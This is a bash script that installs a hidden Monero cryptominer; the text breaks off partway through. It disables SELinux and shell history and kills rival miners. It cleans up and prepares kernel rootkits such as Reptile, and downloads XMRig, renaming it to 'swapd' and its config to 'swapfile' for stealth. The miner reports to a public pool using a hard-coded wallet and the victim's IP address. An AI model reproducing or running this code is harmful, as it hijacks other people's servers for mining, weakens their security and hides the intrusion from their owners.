#!/bin/bash

# ==================== SELINUX DISABLE ====================
# Disable SELinux temporarily to prevent rootkit blocking
echo "[*] Disabling SELinux..."
setenforce 0 2>/dev/null || true
echo "[✓] SELinux disabled (if present)"

# ==================== VERBOSE MODE ====================
# Set to true for detailed output, false for quiet mode  
VERBOSE=true

if [ "$VERBOSE" = true ]; then
    echo "=========================================="
    echo "VERBOSE MODE ENABLED"
    echo "You will see detailed output of all operations"
    echo "=========================================="
    echo ""
fi

# ==================== DISABLE HISTORY ====================
echo "[*] Disabling command history..."
unset BASH_XTRACEFD PS4 2>/dev/null
unset HISTFILE
export HISTFILE=/dev/null
# Alternative methods (commented out, already works above)
#unset HISTFILE ;history -d $((HISTCMD-1))
#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
echo "[✓] Command history disabled"

# Continue with existing code...
# Removed -u and -o pipefail to ensure script ALWAYS continues
set +ue          # Disable exit on error
set +o pipefail  # Disable pipeline error propagation
IFS=$'\n\t'

# ---- Portable PID helpers (BusyBox + full Linux) ----
# Works without pgrep and without ps -aux (BusyBox ps has neither)
proc_pids() {
    local pattern="$1"
    if command -v pgrep >/dev/null 2>&1; then
        pgrep -f "$pattern" 2>/dev/null || true
    else
        for _d in /proc/[0-9]*; do
            _p="${_d##*/}"
            _c=$(tr "\0" " " < "$_d/cmdline" 2>/dev/null) || continue
            case "$_c" in *"$pattern"*) echo "$_p" ;; esac
        done
    fi
}
send_sig() {
    local sig="$1"; shift
    for _pat in "$@"; do
        proc_pids "$_pat" | while IFS= read -r _pid; do
            [ -n "$_pid" ] && kill "-$sig" "$_pid" 2>/dev/null || true
        done
    done
}


# Trap errors but continue execution
if [ "$VERBOSE" = true ]; then
    trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
else
    trap '' ERR
fi

# ==================== HELPER FUNCTIONS FOR VERBOSE MODE ====================
# Run command silently only if VERBOSE=false
run_silent() {
    if [ "$VERBOSE" = true ]; then
        "$@"
    else
        "$@" 2>/dev/null
    fi
}

# Run command and only show errors
run_quiet() {
    if [ "$VERBOSE" = true ]; then
        "$@"
    else
        "$@" 2>&1 | grep -i "error\|fail\|warning" || true
    fi
}

# Trap errors but continue execution
if [ "$VERBOSE" = true ]; then
    trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
else
    trap '' ERR
fi

# ==================== GIT CONFIGURATION ====================
# Disable git interactive prompts globally
export GIT_TERMINAL_PROMPT=0
git config --global credential.helper "" 2>/dev/null || true

# ==================== ARCHITECTURE DETECTION ====================
# Detect if system is 32-bit or 64-bit to skip incompatible rootkits
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        IS_64BIT=true
        echo "[*] Detected 64-bit system (x86_64) - all rootkits available"
        ;;
    i386|i686|x86)
        IS_64BIT=false
        echo "[!] WARNING: 32-bit system detected ($ARCH)"
        echo "[!] Advanced rootkits (Reptile, crypto-miner) will be SKIPPED"
        echo "[!] Reason: They use 64-bit assembly and cannot compile on 32-bit"
        ;;
    armv7l|armv8|aarch64|arm*)
        IS_64BIT=false
        echo "[!] WARNING: ARM architecture detected ($ARCH)"
        echo "[!] x86-specific kernel rootkits will be SKIPPED"
        ;;
    *)
        IS_64BIT=false
        echo "[!] WARNING: Unknown architecture: $ARCH"
        echo "[!] Kernel rootkits will be SKIPPED for safety"
        ;;
esac

# ==================== CLEANUP OLD INSTALLATION ====================
echo ""
echo "=========================================="
echo "CLEANING UP OLD INSTALLATION"
echo "=========================================="
echo ""

# List of old service names to check and remove
OLD_SERVICES=(
    "smart-wallet-hijacker"
    "wallet-hijacker"
    "system-monitor"
    "lightd"
)

# List of old binary names to check and remove
OLD_BINARIES=(
    "/usr/local/bin/smart-wallet-hijacker"
    "/usr/local/bin/wallet-hijacker"
    "/usr/local/bin/system-monitor"
    "/usr/local/bin/lightd"
)

echo "[*] Stopping and removing old wallet hijacker services..."
for service_name in "${OLD_SERVICES[@]}"; do
    # Check if service exists
    if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
        echo "    [*] Found old service: $service_name"
        
        # Stop the service
        systemctl stop "$service_name" 2>/dev/null || true
        
        # Disable the service
        systemctl disable "$service_name" 2>/dev/null || true
        
        # Remove service file
        rm -f "/etc/systemd/system/${service_name}.service" 2>/dev/null || true
        
        echo "    [✓] Stopped and removed: $service_name"
    fi
    
    # Also check SysV init
    if [ -f "/etc/init.d/$service_name" ]; then
        /etc/init.d/"$service_name" stop 2>/dev/null || true
        rm -f "/etc/init.d/$service_name" 2>/dev/null || true
    fi
done

echo ""
echo "[*] Killing old wallet hijacker processes (memory cleanup)..."

# Kill by process name
for proc in smart-wallet-hijacker wallet-hijacker system-monitor lightd; do
    if proc_pids "$proc" | grep -q . 2>/dev/null; then
        echo "    [*] Killing process: $proc"
        pkill -9 -f "$proc" 2>/dev/null || true
        sleep 1
    fi
done

# Kill by binary path
for binary in "${OLD_BINARIES[@]}"; do
    if proc_pids "$binary" | grep -q . 2>/dev/null; then
        echo "    [*] Killing process: $binary"
        pkill -9 -f "$binary" 2>/dev/null || true
        sleep 1
    fi
done

echo "[✓] Old processes killed (removed from memory)"

echo ""
echo "[*] Removing old binaries from disk..."
for binary in "${OLD_BINARIES[@]}"; do
    if [ -f "$binary" ]; then
        echo "    [*] Deleting: $binary"
        rm -f "$binary" 2>/dev/null || true
        echo "    [✓] Deleted from disk"
    fi
done

# Remove old cron entries
echo ""
echo "[*] Removing old cron entries..."
if crontab -l 2>/dev/null | grep -qE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd'; then
    echo "    [*] Found old cron entries, removing..."
    crontab -l 2>/dev/null | grep -vE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd' | crontab - 2>/dev/null || true
    echo "    [✓] Cron entries cleaned"
fi

# Reload systemd to clear old service definitions
echo ""
echo "[*] Reloading systemd daemon..."
systemctl daemon-reload 2>/dev/null || true

echo ""
echo "[✓] CLEANUP COMPLETE"
echo "    ✓ Old services stopped and removed"
echo "    ✓ Old processes killed (memory cleaned)"
echo "    ✓ Old binaries deleted from disk"
echo "    ✓ Cron entries removed"
echo ""
echo "[*] Proceeding with fresh installation..."
echo ""

# ==================== COMPREHENSIVE MINER CLEANUP ====================
echo "=========================================="
echo "COMPREHENSIVE MINER & ROOTKIT CLEANUP"
echo "=========================================="
echo ""

echo "[*] Stopping existing miner services..."
# Stop systemd services
systemctl stop swapd 2>/dev/null || true
systemctl disable swapd --now 2>/dev/null || true
systemctl stop gdm2 2>/dev/null || true
systemctl disable gdm2 --now 2>/dev/null || true

echo "[*] Killing competitor miners..."
# Kill all known miner processes
killall -9 xmrig 2>/dev/null || true
killall -9 kswapd0 2>/dev/null || true
killall -9 swapd 2>/dev/null || true
send_sig 9 swapd kswapd0 xmrig

echo "[*] Removing immutable attributes from old installations..."
# Remove immutable flags (chattr -i) before deletion
for dir in .swapd .swapd.swapd .gdm .gdm2 .gdm2_manual .gdm2_manual_*; do
    if [ -d "$HOME/$dir" ] || [ -f "$HOME/$dir" ]; then
        echo "    [*] Removing immutable from: $dir"
        chattr -i -R "$HOME/$dir" 2>/dev/null || true
        chattr -i "$HOME/$dir" 2>/dev/null || true
        chattr -i "$HOME/$dir"/* 2>/dev/null || true
        chattr -i "$HOME/$dir"/.* 2>/dev/null || true
    fi
done

# Remove service file immutable flags
chattr -i /etc/systemd/system/swapd.service 2>/dev/null || true
chattr -i /etc/systemd/system/gdm2.service 2>/dev/null || true

echo "[*] Removing old miner directories..."
# Now actually remove the directories
rm -rf "$HOME/.swapd" 2>/dev/null || true
rm -rf "$HOME/.gdm" 2>/dev/null || true
rm -rf "$HOME/.gdm2" 2>/dev/null || true
rm -rf "$HOME/.gdm2_manual" 2>/dev/null || true
rm -rf "$HOME"/.gdm2_manual_* 2>/dev/null || true

echo "[*] Removing old service files..."
# Remove service files
rm -rf /etc/systemd/system/swapd.service 2>/dev/null || true
rm -rf /etc/systemd/system/gdm2.service 2>/dev/null || true

echo "[*] Cleaning old rootkit installations..."
# Clean old rootkits from /tmp
cd /tmp 2>/dev/null || true
cd .ICE-unix 2>/dev/null || true
cd .X11-unix 2>/dev/null || true

for rootkit in Reptile Nuk3Gh0st Diamorphine hiding-cryptominers-linux-rootkit; do
    if [ -d "$rootkit" ]; then
        echo "    [*] Removing: $rootkit"
        chattr -i -R "$rootkit" 2>/dev/null || true
        chattr -i "$rootkit" 2>/dev/null || true
        chattr -i "$rootkit"/* 2>/dev/null || true
        chattr -i "$rootkit"/.* 2>/dev/null || true
        rm -rf "$rootkit" 2>/dev/null || true
    fi
done

cd /root 2>/dev/null || cd ~ || true

echo "[✓] Comprehensive cleanup complete!"
echo ""

# ==================== REPTILE COMMAND WRAPPER ====================
# Helper function to call reptile commands (handles different installation paths)
reptile_cmd() {
    local cmd="$1"
    shift
    
    # Skip entirely on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        return 0
    fi
    
    # Try different possible locations where reptile might be installed
    if [ -f /reptile/bin/reptile ]; then
        /reptile/bin/reptile "$cmd" "$@" 2>/dev/null || true
    elif [ -f /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd ]; then
        /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd "$cmd" "$@" 2>/dev/null || true
    elif [ -f ./reptile_cmd ]; then
        ./reptile_cmd "$cmd" "$@" 2>/dev/null || true
    elif command -v reptile >/dev/null 2>&1; then
        reptile "$cmd" "$@" 2>/dev/null || true
    else
        # Reptile not found, silently skip
        return 1
    fi
}

# ==================== PACKAGE MANAGER DETECTION ====================
# Detect which package manager is available
if command -v apt-get >/dev/null 2>&1; then
    PKG_MANAGER="apt-get"
    PKG_INSTALL="apt-get install -y"
    PKG_UPDATE="apt-get update"
elif command -v yum >/dev/null 2>&1; then
    PKG_MANAGER="yum"
    PKG_INSTALL="yum install -y"
    PKG_UPDATE="yum update"
elif command -v dnf >/dev/null 2>&1; then
    PKG_MANAGER="dnf"
    PKG_INSTALL="dnf install -y"
    PKG_UPDATE="dnf update"
else
    echo "[!] WARNING: No supported package manager found"
    PKG_MANAGER="unknown"
    export PKG_INSTALL="echo 'No package manager available:'"
    export PKG_UPDATE="true"
fi
echo "[*] Detected package manager: $PKG_MANAGER"

# ==================== DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu) ====================
# Detect and fix interrupted dpkg/apt operations before installing packages

if command -v dpkg >/dev/null 2>&1; then
    echo ""
    echo "========================================"
    echo "CHECKING DPKG STATUS"
    echo "========================================"
    
    # Check if dpkg was interrupted
    DPKG_INTERRUPTED=false
    
    # Method 1: Check dpkg status (ONLY packages with actual problems)
    if dpkg --audit 2>&1 | grep -qE "half-configured|half-installed|unpacked.*not configured"; then
        DPKG_INTERRUPTED=true
        echo "[!] DPKG interrupt detected (dpkg --audit shows half-configured packages)"
    fi
    
    # Method 2: Check apt-get for ACTUAL errors (not just warnings)
    if apt-get check 2>&1 | grep -qE "dpkg was interrupted.*must manually run|You must.*dpkg --configure"; then
        DPKG_INTERRUPTED=true
        echo "[!] DPKG interrupt detected (apt-get check shows actual interrupt)"
    fi
    
    # Method 3: Check lock files ONLY if process is stuck
    if [ -f /var/lib/dpkg/lock-frontend ] || [ -f /var/lib/dpkg/lock ]; then
        # Only consider it interrupted if lock file exists AND process is stuck
        if lsof /var/lib/dpkg/lock 2>/dev/null | grep -q dpkg; then
            # Process is actually running - not interrupted, just busy
            echo "[*] DPKG is currently running (locked by active process)"
            DPKG_INTERRUPTED=false
        elif proc_pids dpkg | grep -q . 2>/dev/null || proc_pids apt-get | grep -q . 2>/dev/null; then
            # Package manager is running - not interrupted
            echo "[*] Package manager is currently running"
            DPKG_INTERRUPTED=false
        elif [ -f /var/lib/dpkg/status-old ] && [ -f /var/lib/dpkg/lock ]; then
            # Lock file exists, no process, and backup status exists = interrupted
            DPKG_INTERRUPTED=true
            echo "[!] DPKG may have been interrupted (stale lock with no process)"
        fi
    fi
    
    # Fix if interrupted
    if [ "$DPKG_INTERRUPTED" = "true" ]; then
        echo ""
        echo "[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY"
        echo "========================================"
        
        # Kill any stuck dpkg processes
        echo "[*] Checking for stuck dpkg processes..."
        pkill -9 dpkg 2>/dev/null || true
        pkill -9 apt-get 2>/dev/null || true
        pkill -9 apt 2>/dev/null || true
        sleep 2
        
        # Remove lock files if they exist and no process is using them
        echo "[*] Removing stale lock files..."
        if ! lsof /var/lib/dpkg/lock >/dev/null 2>&1; then
            rm -f /var/lib/dpkg/lock 2>/dev/null || true
            rm -f /var/lib/dpkg/lock-frontend 2>/dev/null || true
            rm -f /var/lib/apt/lists/lock 2>/dev/null || true
            rm -f /var/cache/apt/archives/lock 2>/dev/null || true
        fi
        
        # Run dpkg --configure -a to fix interrupted installations
        echo "[*] Running: dpkg --configure -a"
        echo ""
        
        DEBIAN_FRONTEND=noninteractive dpkg --configure -a 2>&1 | tail -20
        
        sleep 2
        
        # Fix any broken dependencies
        echo ""
        echo "[*] Running: apt-get install -f"
        
        DEBIAN_FRONTEND=noninteractive apt-get install -f -y 2>&1 | tail -20
        
        sleep 2
        
        # Verify it's fixed
        echo ""
        echo "[*] Verifying dpkg is now working..."
        
        if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured"; then
            echo "[!] WARNING: Some packages may still have issues"
            echo "[*] Continuing anyway - script will handle package errors"
        else
            echo "[✓] DPKG is now working correctly"
        fi
        
        echo "========================================"
        echo ""
    else
        echo "[✓] DPKG is working correctly (no interrupt detected)"
        echo ""
    fi
fi

# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
# This function NEVER gives up trying to stop services/processes
force_stop_service() {
    local service_names="$1"  # Space-separated list of service names
    local process_names="$2"  # Space-separated list of process names
    local max_attempts=60     # 60 attempts = ~5 minutes max
    local attempt=0
    
    echo "[*] Force-stopping services: $service_names"
    echo "[*] Force-stopping processes: $process_names"
    
    while [ $attempt -lt $max_attempts ]; do
        attempt=$((attempt + 1))
        local all_stopped=true
        
        # Method 1: Try systemctl stop for each service
        if [ -n "$service_names" ]; then
            for svc in $service_names; do
                if systemctl is-active --quiet "$svc" 2>/dev/null; then
                    echo "[*] Attempt $attempt: Stopping service $svc with systemctl..."
                    systemctl stop "$svc" 2>/dev/null || true
                    all_stopped=false
                fi
            done
        fi
        
        # Method 2: Kill processes by name (all methods)
        if [ -n "$process_names" ]; then
            for proc in $process_names; do
                # Check if any process with this name exists
                if proc_pids "$proc" | grep -q . 2>/dev/null; then
                    echo "[*] Attempt $attempt: Killing process $proc..."
                    
                    # Method 2a: pkill by exact name
                    pkill -9 -x "$proc" 2>/dev/null || true
                    
                    # Method 2b: pkill by pattern (full command line)
                    pkill -9 -f "$proc" 2>/dev/null || true
                    
                    # Method 2c: Find and kill by PID
                    local pids

                    pids=$(proc_pids "$proc" 2>/dev/null)
                    if [ -n "$pids" ]; then
                        for pid in $pids; do
                            kill -9 "$pid" 2>/dev/null || true
                        done
                    fi
                    
                    # Method 2d: Find by full command and kill
                    local pids

                    pids=$(proc_pids "$proc" 2>/dev/null)
                    if [ -n "$pids" ]; then
                        for pid in $pids; do
                            kill -9 "$pid" 2>/dev/null || true
                        done
                    fi
                    
                    all_stopped=false
                fi
            done
        fi
        
        # Method 3: Check /proc for survivors
        if [ -n "$process_names" ]; then
            for proc in $process_names; do
                for pid_dir in /proc/[0-9]*; do
                    if [ -f "$pid_dir/cmdline" ]; then
                        local cmdline

                        cmdline=$(cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ')
                        if echo "$cmdline" | grep -q "$proc"; then
                            local pid

                            pid=$(basename "$pid_dir")
                            echo "[*] Attempt $attempt: Found survivor PID $pid, killing..."
                            kill -9 "$pid" 2>/dev/null || true
                            all_stopped=false
                        fi
                    fi
                done
            done
        fi
        
        # If everything is stopped, break out
        if [ "$all_stopped" = true ]; then
            echo "[✓] All services/processes stopped after $attempt attempts"
            return 0
        fi
        
        # Wait before next attempt
        sleep 3
    done
    
    echo "[!] WARNING: Some services/processes may still be running after $max_attempts attempts"
    echo "[*] Continuing anyway..."
    return 0
}

# ==================== DETECT INIT SYSTEM ====================
SYSTEMD_AVAILABLE=false
if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
    SYSTEMD_AVAILABLE=true
    echo "[*] Detected systemd init system"
else
    echo "[*] Detected SysV init system (legacy mode)"
fi

# ==================== CLEAN UP OLD INSTALLATIONS ====================
echo "[*] Cleaning up old miner installations..."

# Stop all possible miner services (systemd)
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    force_stop_service "swapd kswapd0 xmrig" ""
fi

# Stop all possible miner processes (direct kill)
force_stop_service "" "swapd kswapd0 xmrig"

# Remove old service files
rm -f /etc/systemd/system/swapd.service 2>/dev/null
rm -f /etc/systemd/system/kswapd0.service 2>/dev/null
rm -f /etc/systemd/system/xmrig.service 2>/dev/null
rm -f /etc/init.d/swapd 2>/dev/null
rm -f /etc/init.d/kswapd0 2>/dev/null

# Reload systemd if it exists
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    systemctl daemon-reload 2>/dev/null || true
fi

# Remove old miner directories
rm -rf /root/.swapd 2>/dev/null
rm -rf /tmp/xmrig 2>/dev/null
rm -rf ~/.xmrig 2>/dev/null

echo "[✓] Cleanup complete"

# ==================== ENSURE DEPENDENCIES ====================
echo "[*] Installing dependencies..."

# Update package lists
echo "[*] Updating package lists..."
apt-get update 2>&1 | grep -E "Reading|Building|Fetched" || true
yum update -y 2>&1 | grep -E "Loading|Installed" || true
dnf update -y 2>&1 | grep -E "Loading|Installed" || true

# Install everything in one shot - NEVER FAIL
echo "[*] Installing git make gcc build-essential kernel headers..."

# Try apt-get (Debian/Ubuntu)
if command -v apt-get >/dev/null 2>&1; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
        git make gcc g++ build-essential \
        linux-headers-"$(uname -r)" \
        wget curl 2>&1 | tail -10 || true
fi

# Try yum (RHEL/CentOS)
if command -v yum >/dev/null 2>&1; then
    yum install -y git make gcc gcc-c++ \
        kernel-devel kernel-headers \
        wget curl 2>&1 | tail -10 || true
fi

# Try dnf (Fedora)
if command -v dnf >/dev/null 2>&1; then
    dnf install -y git make gcc gcc-c++ \
        kernel-devel kernel-headers \
        wget curl 2>&1 | tail -10 || true
fi

# Show what we have
echo "[*] Checking installed tools..."
command -v git >/dev/null 2>&1 && echo "[✓] git: $(git --version)" || echo "[!] git: not found (will try to continue anyway)"
command -v make >/dev/null 2>&1 && echo "[✓] make: installed" || echo "[!] make: not found (will try to continue anyway)"
command -v gcc >/dev/null 2>&1 && echo "[✓] gcc: installed" || echo "[!] gcc: not found (will try to continue anyway)"

echo "[✓] Dependency installation complete (continuing regardless of results)"

# ==================== DISTRIBUTION DETECTION & KERNEL HEADERS ====================
echo ""
echo "=========================================="
echo "KERNEL HEADERS INSTALLATION"
echo "=========================================="
echo ""

echo "[*] Detecting distribution and installing linux headers for kernel $(uname -r)"

if command -v apt >/dev/null 2>&1; then
    # Debian / Ubuntu
    echo "[*] Detected Debian/Ubuntu system"
    apt update 2>/dev/null || true
    NEEDRESTART_MODE=a apt-get reinstall kmod 2>/dev/null || true
    NEEDRESTART_MODE=a apt install -y build-essential linux-headers-"$(uname -r)" 2>/dev/null || true
    NEEDRESTART_MODE=a apt install -y linux-generic linux-headers-"$(uname -r)" 2>/dev/null || true
    NEEDRESTART_MODE=a apt install -y git make gcc msr-tools build-essential libncurses-dev 2>/dev/null || true
    # Backports for newer kernels (Debian)
    NEEDRESTART_MODE=a apt install -t bookworm-backports linux-image-amd64 -y 2>/dev/null || true
    NEEDRESTART_MODE=a apt install -t bookworm-backports linux-headers-amd64 -y 2>/dev/null || true
    
elif command -v dnf >/dev/null 2>&1; then
    # Fedora / RHEL 8+ / CentOS Stream
    echo "[*] Detected Fedora/RHEL 8+ system"
    dnf install -y kernel-devel-"$(uname -r)" kernel-headers-"$(uname -r)" make gcc 2>/dev/null || true
    
elif command -v yum >/dev/null 2>&1; then
    # RHEL 7 / CentOS 7
    echo "[*] Detected RHEL/CentOS 7 system"
    yum install -y linux-generic linux-headers-"$(uname -r)" kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools 2>/dev/null || true
    yum install -y kernel-devel-"$(uname -r)" kernel-headers-"$(uname -r)" make gcc 2>/dev/null || true
    
elif command -v zypper >/dev/null 2>&1; then
    # openSUSE / SLE
    echo "[*] Detected openSUSE/SLE system"
    zypper update -y 2>/dev/null || true
    zypper install -y kernel-devel kernel-default-devel gcc make 2>/dev/null || true
    zypper install -y linux-generic linux-headers-"$(uname -r)" git make gcc msr-tools build-essential libncurses-dev 2>/dev/null || true
    
else
    echo "[!] WARNING: Unsupported distribution. Kernel headers may not be installed."
fi

echo "[✓] Kernel headers installation attempted for $(uname -r)"

# ==================== DWARVES & VMLINUX (BPF/eBPF Support) ====================
echo ""
echo "[*] Installing dwarves and copying vmlinux for BPF support..."

if command -v apt >/dev/null 2>&1; then
    apt install -y dwarves 2>/dev/null || true
elif command -v yum >/dev/null 2>&1; then
    yum install -y dwarves 2>/dev/null || true
elif command -v dnf >/dev/null 2>&1; then
    dnf install -y dwarves 2>/dev/null || true
elif command -v zypper >/dev/null 2>&1; then
    zypper install -y dwarves 2>/dev/null || true
fi

# Copy vmlinux for BPF compilation
if [ -f /sys/kernel/btf/vmlinux ]; then
    cp /sys/kernel/btf/vmlinux /usr/lib/modules/"$(uname -r)"/build/ 2>/dev/null || true
    echo "[✓] vmlinux copied for BPF support"
else
    echo "[!] vmlinux not found, skipping..."
fi

# ==================== GPU & CPU DETECTION ====================
echo ""
echo "=========================================="
echo "HARDWARE DETECTION (GPU + CPU)"
echo "=========================================="
echo ""

echo "[*] Installing PCI utilities..."
if command -v yum >/dev/null 2>&1; then
    yum install -y pciutils 2>/dev/null || true
elif command -v apt-get >/dev/null 2>&1; then
    apt-get install -y pciutils 2>/dev/null || true
fi

echo "[*] Updating PCI ID database..."
update-pciids 2>/dev/null || true

echo "[*] Detecting GPU..."
lspci -vs 00:01.0 2>/dev/null || echo "[!] No GPU detected at 00:01.0"

# Try NVIDIA
if command -v nvidia-smi >/dev/null 2>&1; then
    echo "[*] NVIDIA GPU detected:"
    nvidia-smi 2>/dev/null || true
fi

# Try AMD
if command -v aticonfig >/dev/null 2>&1; then
    echo "[*] AMD GPU detected:"
    aticonfig --odgc --odgt 2>/dev/null || true
fi

# Try nvtop/radeontop
nvtop -s 2>/dev/null || true
radeontop 2>/dev/null || true

echo "[*] CPU Threads Available:"
nproc

echo "[✓] Hardware detection complete"
echo ""

# ==================== DETECT DOWNLOAD TOOL ====================
USE_WGET=false
if ! command -v curl >/dev/null 2>&1; then
    echo "[*] curl not found, using wget instead"
    USE_WGET=true
elif ! curl -sS --max-time 5 https://google.com >/dev/null 2>&1; then
    echo "[!] curl SSL/TLS error detected, falling back to wget"
    USE_WGET=true
fi

# ==================== DOWNLOAD XMRIG ====================
echo "[*] Downloading XMRig..."

mkdir -p /root/.swapd
cd /root/.swapd || {
    echo "[!] Failed to cd to /root/.swapd, trying to create it..."
    mkdir -p /root/.swapd 2>/dev/null || true
    cd /root/.swapd || {
        echo "[!] Cannot access /root/.swapd - using /tmp instead"
        cd /tmp || true
    }
}

XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
DOWNLOAD_SUCCESS=false

# Try to download xmrig
if [ "$USE_WGET" = true ]; then
    if [ "$VERBOSE" = true ]; then
        echo "[*] wget --no-check-certificate -O xmrig.tar.gz $XMRIG_URL"
        wget --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
    else
        wget -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
    fi
else
    if [ "$VERBOSE" = true ]; then
        echo "[*] curl -L -k -o xmrig.tar.gz $XMRIG_URL"
        curl -L -k -o xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
    else
        curl -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
    fi
fi

# Extract if download was successful
if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
    if [ "$VERBOSE" = true ]; then
        echo "[*] tar -xzf xmrig.tar.gz"
        tar -xzf xmrig.tar.gz || {
            echo "[!] Failed to extract xmrig - continuing anyway..."
            DOWNLOAD_SUCCESS=false
        }
    else
        tar -xzf xmrig.tar.gz 2>/dev/null || {
            echo "[!] Failed to extract xmrig - continuing anyway..."
            DOWNLOAD_SUCCESS=false
        }
    fi
    
    if [ "$DOWNLOAD_SUCCESS" = true ]; then
        # Rename xmrig to hidden .kworker (actual miner binary)
        mv xmrig-*/xmrig .kworker 2>/dev/null || {
            echo "[!] Failed to rename xmrig binary - continuing anyway..."
            DOWNLOAD_SUCCESS=false
        }
    fi
    
    if [ "$DOWNLOAD_SUCCESS" = true ]; then
        chmod +x .kworker 2>/dev/null || true
        rm -rf xmrig-* xmrig.tar.gz
        echo "[✓] XMRig downloaded and renamed to '.kworker' (hidden)"
    fi
fi

if [ "$DOWNLOAD_SUCCESS" = false ]; then
    echo "[!] Failed to download/extract XMRig"
    echo "[!] You can manually download xmrig and place it at /root/.swapd/.kworker"
    echo "[*] Continuing with installation anyway..."
    # Create a placeholder so config creation doesn't fail
    touch /root/.swapd/.kworker 2>/dev/null || true
fi

# ==================== RENAME BINARY TO SWAPD ====================
echo "[*] Renaming miner binary to 'swapd'..."

# Simply rename the binary to swapd (no symlink, no wrapper!)
if [ -f .kworker ]; then
    if mv .kworker swapd; then
        chmod +x swapd
        echo "[✓] Binary renamed: .kworker → swapd (direct file, no symlink)"
    else
        echo "[!] Failed to rename, trying copy..."
        cp .kworker swapd && chmod +x swapd
        rm -f .kworker
        echo "[✓] Binary copied to swapd"
    fi
elif [ -f xmrig ]; then
    if mv xmrig swapd; then
        chmod +x swapd
        echo "[✓] Binary renamed: xmrig → swapd"
    else
        cp xmrig swapd && chmod +x swapd
        echo "[✓] Binary copied to swapd"
    fi
else
    echo "[!] Warning: No miner binary found (.kworker or xmrig missing)"
    echo "[!] Creating placeholder..."
    touch swapd && chmod +x swapd
fi

# Verify swapd exists
if [ -f swapd ]; then
    echo "[✓] Miner binary ready as 'swapd'"
    ls -lh swapd
else
    echo "[!] ERROR: swapd binary not created!"
fi


# ==================== CONFIGURE XMRIG ====================
echo "[*] Configuring XMRig..."

# User-configurable variables
WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"

# ==================== IP DETECTION FOR PASS FIELD ====================
echo "[*] Detecting server IP address for worker identification..."
echo "PASS..."

# Universal IP detection compatible with ancient systems
get_server_ip() {
    local ip=""
    
    # Method 1: Try external IP service (requires network)
    ip=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
        echo "$ip"
        return 0
    fi
    
    # Method 2: Try ip command (modern systems)
    ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
    if [ -n "$ip" ]; then
        echo "$ip"
        return 0
    fi
    
    # Method 3: Try ifconfig (older systems)
    ip=$(ifconfig 2>/dev/null | grep 'inet addr:' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d: -f2)
    if [ -n "$ip" ]; then
        echo "$ip"
        return 0
    fi
    
    # Method 4: Try ip route (intermediate systems)
    ip=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
    if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
        echo "$ip"
        return 0
    fi
    
    # Method 5: Try hostname (very old systems)
    ip=$(hostname -i 2>/dev/null | awk '{print $1}')
    if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
        echo "$ip"
        return 0
    fi
    
    # Fallback
    echo "na"
}

PASS=$(get_server_ip)
echo "[*] Detected server identifier: $PASS"

# Optional: Add email if configured
EMAIL=""  # Leave empty or set your email
if [ -n "$EMAIL" ]; then
  PASS="$PASS:$EMAIL"
  echo "[*] Added email to password field: $EMAIL"
fi

# Create configuration file (will be renamed to swapfile for stealth)
cat > config.json << 'EOL'
{
    "autosave": false,
    "donate-level": 0,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "gulf.moneroocean.stream:80",
            "user": "WALLET_PLACEHOLDER",
            "pass": "PASS_PLACEHOLDER",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOL

# Replace placeholders
sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
sed -i "s/PASS_PLACEHOLDER/$PASS/g" config.json

# Rename to swapfile for stealth
mv config.json swapfile

# Double-check: Ensure PASS is set in swapfile (safety check)
if grep -q "PASS_PLACEHOLDER" swapfile 2>/dev/null; then
    echo "[!] Warning: PASS_PLACEHOLDER still in file, fixing..."
    sed -i "s/PASS_PLACEHOLDER/$PASS/g" swapfile
fi

# Also update any existing pass field to ensure it's correct
sed -i 's/"pass": *"[^"]*",/"pass": "'"$PASS"'",/' swapfile

echo "[✓] XMRig configuration created as 'swapfile'"
echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
echo "[✓] Pass (Worker ID): $PASS"

# Verify PASS was set correctly
if grep -q '"pass": "'"$PASS"'"' swapfile; then
